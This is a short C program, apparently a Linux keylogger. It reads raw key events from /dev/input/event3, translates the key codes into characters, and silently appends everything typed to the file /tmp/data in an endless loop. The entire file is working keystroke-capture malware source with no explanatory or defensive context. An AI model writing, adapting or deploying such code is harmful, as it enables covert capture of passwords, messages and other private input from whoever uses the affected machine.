#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

#define LOGFILE "/tmp/data"

int main(int argc, char *argv[]) {
  struct input_event ev;
  int file_desc = open("/dev/input/event3", O_RDONLY);
  FILE *fp = fopen(LOGFILE, "a");
  char map[] = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";

  while (1) {
    read(file_desc, &ev, sizeof(ev));
    fflush(fp);
    if ((ev.type == EV_KEY) && (ev.value == 0)) {
      switch (ev.code) {
      case 28:
        fprintf(fp, "\n");
        break;
      case 57:
        fprintf(fp, " ");
        break;
      default:
        fprintf(fp, "%c", map[ev.code]);
      }
    }
  }
  return 0;
}
